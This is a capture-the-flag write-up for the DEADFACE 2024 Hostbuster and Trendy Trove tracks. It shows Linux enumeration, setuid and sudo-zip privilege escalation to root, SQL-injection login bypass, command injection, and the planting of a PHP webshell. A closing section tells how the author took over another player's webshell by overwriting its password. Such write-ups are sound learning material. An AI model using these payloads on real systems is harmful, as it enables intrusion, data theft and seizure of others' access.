---
title: DEADFACE CTF
date: 2024-10-20 00:00:00 +0000
categories: [CAPTURE THE FLAG]
tags: [Linux, intermediate, SSH, writeup, RCE, Web, SQL]
---

During October 2024, the cybersecurity month, I took part to the yearly DEADFACE CTF for the first time and it was quite fun. 

I completed the Hostbuster track consisting of owning a Linux machine and this is my writeup. I jumped right into it because I tough it wasn't going to be a big deal and indeed it took me less than an hour to complete, thus this track is excellent because you can find typical misconfigurations for at least the first half of the flag. 

I also completed the Trendytrove track which apparently wasn't that easy to fully complete (47 solves on the last challenge). This track was about sql injection, directory fuzzing and then RCE. 

# Hostbuster - 5 Flags
## Flag 1: Landing zone

So the first step consisted of connecting to the remote machine with the provided credentials on the website:
```Text
ro@Parrot:~/$ ssh deephax@deephax.deadface.io
```
And the first flag could be found by cating the file in the current directory
```Text
~ $ ls
flag1.txt  hint.txt
~ $ cat flag1.txt 
flag{hostbusters1_e361b9b8352eea50}~ $
```

## ~~Flag 2: Short-Term~~ Flag 3: Mind Your Surroundings

The third flag was also pretty straightforward (it appeared to me before the second one), there was a hint note next to the flag which clearly let know tha we have to use the ``env`` command: 
```Text
~ $ cat hint.txt 
The environment hides many secrets...
~ $ env 
USER=deephax
SHLVL=2
HOME=/home/deephax
PAGER=less
LOGNAME=deephax
TERM=xterm
LC_COLLATE=C
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
flag3=flag{hostbusters3_ff07d6fb5ee992f6}
SHELL=/bin/sh
PWD=/home/deephax
CHARSET=UTF-8
~ $ 
```
Running this command also tells us a lot about the system and is something that you should do when you have all sort of bash/ssh/jail challenges. Here I noticed that i am the user deephax (seems obvious because I SSH'ed as this user but I have seen jails where this information is not as obvious), and we can also see that we are using ``sh`` as our shell.

## Flag 2: Short-Term

This flag requires to search a little bit across the system everywhere you can. Sometimes it is a hidden file (starting with a dot), it could also be explicit (named `flag`) or implicit. some interesting directories are the home of the users (your own but could also be the others if you are lucky enough to have the permissions), the directories `/var`, `/tmp`, `/usr`, etc. I found the flag my listing the `/tmp` directory (short-term says the flag, just like my memory). Also when entering in such challenges, do not hesitate to setup your own aliases such as I did, it saves you time and it's a set it and forget it thing.

```Text
~ $ alias "ls"="ls -la"
~ $ ls /tmp
total 12
drwxrwxrwt    1 root     root          4096 Sep 29 17:52 .
drwxr-xr-x    1 root     root          4096 Oct 20 23:20 ..
-rw-r--r--    1 root     root            35 Sep 29 17:51 .flag2.txt
-rw-r--r--    1 root     root             0 Sep 29 17:52 makewhatis.lock
~ $ cat /tmp/.flag2.txt 
flag{hostbusters2_0a2e2dd0461a7fd3}~ $ 
```

You can also slam your best find command on the table and let it cook for you:
```
~ $ find / -name '*flag*' 2> /dev/null
/usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/plugin/include/flag-types.h
/usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/plugin/include/insn-flags.h
/usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/plugin/include/cfg-flags.def
/usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/plugin/include/flags.h
/usr/share/man/man3type/tcflag_t.3type.gz
/usr/share/man/man5/proc_kpageflags.5.gz
/usr/share/man/man3/fegetexceptflag.3.gz
/usr/share/man/man3/fesetexceptflag.3.gz
/usr/share/man/man2/ioctl_iflags.2.gz
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/tmp/.flag2.txt
/home/deephax/flag1.txt
~ $
```
But you have to filter the real flag(s) out of all the garbage (you can also use regex in find to improve the process).

## Flag 4: Eavesdroppers

At this point of the track; the number of solving dropped from ~380 to ~200 so I guess this is where things started to get tough. 


The message coming with the flag title was: 
> Scope out and continue characterizing the host. What is the deephax’s machine doing? Surely it’s doing something - we need to find out what in order to get the fourth flag.

So we had to figure out what this machine was doing, staring by using ``ps``.

```Text 
~ $ ps -a 
PID   USER     TIME  COMMAND
    1 root      0:00 {start.sh} /bin/sh /usr/local/bin/start.sh
    9 root      0:00 crond -b -l 5 -L /dev/null
   10 root      0:00 /usr/local/bin/usrv
   12 deephax   0:00 /bin/sh
   82 deephax   0:00 ps -a
~ $
```
Some stuff are weird here. the root user is running a cronjob, along with something called ``usrv`` and a script called `start.sh`. But there is nothing really explicit about what the server is doing. Before investigating on the cronjob I tried to see which port were open on the machine using ``netstat`` as a last try to see if we could figure out something else and it looks like it paid off.

```Text
netstat: can't scan /proc - are you root?
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:2342            0.0.0.0:*                           -
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
~ $
```

So not only we have a port open but also listening for all incoming connections on udp protocol. As with every techno I don't really know about I try to establish a netcat connection to introduce myself.

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/plz_netcat.jpg)

```Text
~ $ nc -u 127.0.0.1 2342
hello
flag{hostbusters4_3dbd2ed4c572b7ea}Flag sent to client.

```
> Do not forget the -u as it is a UDP connection
And boom another flag. 

## Flag 5: Under Pressure
Remember this cronjob wizardry ? Let's investigate this with in mind the fact that this challenge had the tag "privesc". I often make references to what is written on the challenges statements and it might be because of my academical background but trust me, when you do not know what to look for, the statement often set a crucial context and you can sometimes guess what you are expected to do. So let's root bad boy. 


```Text
~ $ cat /etc/crontabs/root 
# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly

* * * * * /opt/sendit/sendit >> /var/log/sendit.log 2>&1
~ $
```
So something is going on with a program called sendit called every time and the standard error is sent to the logs. Let's see what it this. 
```Text
~ $ /opt/sendit/sendit
Error, no such host: c2.deadface.io
~ $ cat /var/log/sendit.log 
Error, no such host: c2.deadface.io
Error, no such host: c2.deadface.io
Error, no such host: c2.deadface.io
Error, no such host: c2.deadface.io
Error, no such host: c2.deadface.io
...
~ $ ls /opt/
readlog/  sendit/
~ $ ls /opt/sendit/
.config.conf  sendit
~ $ ls /opt/sendit/sendit 
-rwxr-xr-x    1 root     root         19072 Sep 29 17:51 /opt/sendit/sendit
```
The script seems to try to establish a connection with its C2. Most of the privesc on Linux are sudo misconfigurations or SUID on program you can abuse. By the way, I tried ``sudo -l`` and it asked for a password and failed.
Here we can see that I discovered a folder called readlogs that is not supposed to be here next to ``sendit``. ``sendit`` belongs to root, I cated it and (not showing you the garbage) it is a binary. It doesn't seems to be made to take whatever input you give it but readlog ? This thing speaks for itself and is calling me to input some bad things into it:

```Text
~ $ ls /opt/readlog
total 8
drwxr-xr-x    1 root     root          4096 Sep 29 17:52 .
drwxr-xr-x    1 root     root          4096 Sep 29 17:52 ..
~ $ find / -type f -name "*readlog*" 2>/dev/null
/usr/bin/readlog
/usr/share/man/man1/readlog.1
~ $ readlog 
Usage: readlog [-f FILE] [-v]
  -f FILE    Read the specified file.
  -v         Display version information.
~ $ 
```

(Yeah it wasn't in the associated opt directory but I just assumed it was somewhere in the machine.)

```Text
~ $ ls /usr/bin/readlog 
-rwsr-sr-x    1 lilith   lilith       19072 Sep 29 17:52 /usr/bin/readlog
~ $
```
Okay so giving us access to prives directly to the root user seems to be too easy for this CTF, seeing who's owning this executable we might have to make an horizontal privesc before reaching root.

This binary (I also cated it, not showing you, the `file` command wasn't installed) seems to be a custom tool because it has nothing to do with Linux legacy stuff. I messed around, tried to read files with it and it just worked. At some point I just exfiltrated the binary to reverse it. To exfiltrate a binary you can just input it to base64, copy paste the base64 on your machine and revert the process. 

```Text
~ $ base64 -w0 /usr/bin/readlog
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAEBEAAAAAAABAAAAAAAAAAIBBAAAAAAAAAAAAAEAAOAANAEAAJAAjAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgAAAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAA...
```

Then on your local machine create a text file where you paste the base64 string and:

```Text
RMI78@4tt4ck:~/Downloads/DEADFACE/Hostbuster$ base64 -d readlogs > readlogs2.exe
```

The binary has not for purpose to run on your machine, the goal is here to input it into Ghidra, Angr or whatever tool you use for reverse engineering.

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/angr_ghidra_rev_bin.png)

You can see over the different tools and with the above image that there is a command called "execute_command_as_lilith" which smells really good, and in the main function, you can see by the getops function that you also have an hidden option "c" which could stand for "command" so let's try opening a bash with that.

```Text
~ $ readlog -c sh
Executing command as lilith: sh
~ $ whoami
lilith
~ $
```

Okay so my first reflex after that was to see if sudo can be abused.

```Text
~ $ sudo -l 
User lilith may run the following commands on 330f0a5da9a4:
    (ALL) NOPASSWD: /usr/bin/zip
~ $
```

And now if you know the website [GTFOBins](https://gtfobins.github.io/), you know it is already a win to root. Look for the appropriate zip page, you barely have to understand the payload, just copy-past and you're in:

```Text
~ $ TF=$(mktemp -u)
~ $ sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF  adding: etc/hosts (deflated 35%)
/home/deephax # sudo rm $TF
BusyBox v1.36.1 (2024-06-10 07:11:47 UTC) multi-call binary.

Usage: rm [-irf] FILE...

Remove (unlink) FILEs

	-i	Always prompt before removing
	-f	Never prompt
	-R,-r	Recurse
/home/deephax # whoami
root
/home/deephax #
```

## Flag 6: Send It

Okay so when I saw the challenge name, I knew something was going on with the ``sendit`` program. I remember there was a .config.json when listing the directory of the program. 

```Text
/home/deephax # cat /opt/sendit/.config.conf 
{
  "host": "c2.deadface.io",
  "port": 1516,
  "path": "/opt/sendit"
}
/home/deephax #
```

At this point it is pretty obvious to see where this is going. As root you can either change the config file I opted for the second option to let everything untouched here: change the ``/etc/hosts`` file to redirect all traffic going to this domain, on localhost:

```Text
/home/deephax # echo "127.0.0.1    c2.deadface.io" >> /etc/hosts 
/home/deephax # nc -lp 1516
flag{hostbusters5_7af321526c15006a}
```

Then I just set up netcat to listen on the right port and as it is a cronjob, I know it is not instantaneous so I just waited a couple of minutes and Voila !

# Trendy Trove - 3 Flags

## Flag 1: Let me In

This one was solved many times, pretty straightforward, you land on website asking you for some credentials, again "sql" in the tags associated with the challenge, first try (pretty much proud of it):

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveSQL.png) 

Because it is on the username you log with a user ID of 1 which is the admin which grant you admin right and then you grab the flag on the first item.

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveFirstFlag.png)

## Flag 2: Yalonda

Here we need to find Yalonda's birthday date, mean there should be a way to expose customer's data, so I messed around with the application, explored the profile page but nothing. Instead of fuzzing the website, I just, by pure coincidence, tried to see if there was an admin page by entering the following url:
```Text
https://trendytrove.deadface.io/admin.php
```
And it paid off:
![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveAdminPage.png)

But still no way to have Yalonda's birthday date. Something was wrong with this page, the "Status Check" kept repeating the same thing no matter how many times I pressed the button:

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveStatusCheck.png)

So I started the development tool on my browser to see the request being sent to the server when I pressed the button:

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveRCEDevTool.png)

Oh boy, that is an RCE (Remote Code Execution) here, the "command" value is something executed on the server. From here some folks may start their best Burp Suite or whatever tool proxying browser to intercept and modify the request before it leaves. I personnaly stayed with my Firefox knowing you can replay requests from the dev tool interface, so I tried a couple of options to see what I can do as an (I assumed) "www-data" user. 

I tried the following input as a command because having write permission on the folder would allow the injection of a PHP web shell:
```Text
command="echo thisisatest > test.txt && ls -a"&check_status=
```
And I was right about the RCE and writing access (text.txt cropped away from the image)

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveStatusCheckls.png)

So let's inject a webshell ! You can choose something flashy from GitHub, I just stay stuck with the most short and basic one who gets you everywhere:
```PHP
<?php system($_GET['cmd']); ?>
``` 
This way you can just send your command through the cmd argument, it is ugly but it works. 

So just send
```
command=echo '<?php system($_GET['cmd']); ?>' > webshell.php&check_status=
```

and go to the /webshell.php?cmd=whoami page:

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveWebShellWhoami.png)

If we forget the warning we are in as www-data, from here let's do a little bit of explorations !

From the previous screenshot you can already tell that we are in a Docker container (the Dockerfile) which is typically what you want to have when you create a CTF but it also involves some automatic setup such as populating the database, and it seems like there is a db-init directory, which hold an ``init.sql`` file, so by injecting the following command:
```
https://trendytrove.deadface.io/webshell.php?cmd=cat%20db-init/init.sql
```

you get the following result:

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveYalondaFlag.png)

All the different data about all the different users, including non-hashed password (which allow you to legitimately log as any user in the website if you want) but also Yalonda's birthday date which is the flag. 

```
flag{1990-03-05}
```

## Flag 3: Compromised data

This flag was about credit cards data which we already had since we "dumped" the database before but still no flags which is weird. Let's explore the system again looking for something else apparently. If we list the current directory we have something called output (can also be seen when I did the first injection), it turned out to be a directory containing something called ``customer.csv``. Let's ``cat`` it then:

![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/TrendyTroveCompromisedData.png)

There you have the last flag
```
flag{C0MM4ND_1NJ3CT10N_3XP0S3D_D4T4}
```

## Oopsie
During the CTF, this Docker container received some injections such as I did, there was a couple of WebShells including mine but at some point I have seen only 2 webshells remaining, mine and a ``_r_.php`` then suddenly only my webshell got wiped of the system, not the other one. So if you had this shell and you removed mine just know that I read your password-protected shell code, then I reused the RCE to erase your SHA/MD5 password-hashed by mine, thus, stealing your shell (which was really good by the way). If you removed mine I think it's fair, if not... oopsie.


# Conclusion
As said in the intro, those tracks were really interesting because using a lot of typical vulnerabilities. I really enjoyed it and I wanted to thanks [syyntax](https://github.com/syyntax) for all the hard work on it.

I also did a lot of other challenges but most of them are harder to explain, or I am too lazy to explain them, or again, someone else did a fantastic writeup on it and writing writeups takes times and energy that I am running out of.

## Other writeups per challenges

The [TheZeal0t video](https://youtu.be/YXRf9HqrYg4) covers:
- The full Cereal Killer track
- Syncopated Beat - Steganography
- Sleeping (Marble) Beauty - Steganography
- Image of the Beast - Steganography
- She's Got Issues - OSINT
- Juggling Too Many - PWN 
- The Silver Swan - Programming
  
On [RP-01's Medium](https://medium.com/@Thetruthseeker613284/deadface-2024-rp01-writeups-8d9363bbc530), you can find:
- The full Chase track
- Hidden in Plain Site - OSINT
- Missing Persons - OSINT
- Price Check - Steganography
- Data Breach - Traffic Analysis
- Wild Wild West - Traffic Analysis

On [neatzsche's GitHub repo](https://github.com/neatzsche/2024deadface), you can find code for:
- Discreet Log - Cryptography
- Killer Curves - Cryptography
- Dead Browse 1 - dead_browse
- ShellDrizzle - dead_browse

